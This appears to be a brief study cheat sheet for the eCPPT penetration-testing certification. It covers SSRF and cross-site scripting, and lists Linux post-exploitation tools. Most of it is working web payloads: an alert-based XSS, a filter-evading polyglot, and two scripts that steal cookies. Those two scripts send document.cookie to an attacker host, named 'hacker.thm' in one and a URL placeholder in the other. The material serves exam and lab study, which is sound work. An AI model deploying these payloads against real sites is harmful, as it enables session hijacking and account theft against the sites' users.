## eCPPT Tools


SSRF Example

```
In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. Next
```

XSS Example

```
<script>alert('XSS');</script>

```

Cookie stealing
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```

Closign the input tag
```
The important part of the payload is the "> which closes the value parameter and then closes the input tag.

```

Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```

Fetch Cookie using Javascript

```
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>

```



# Post Exploitation Linux

* 3snake
* Bettercap


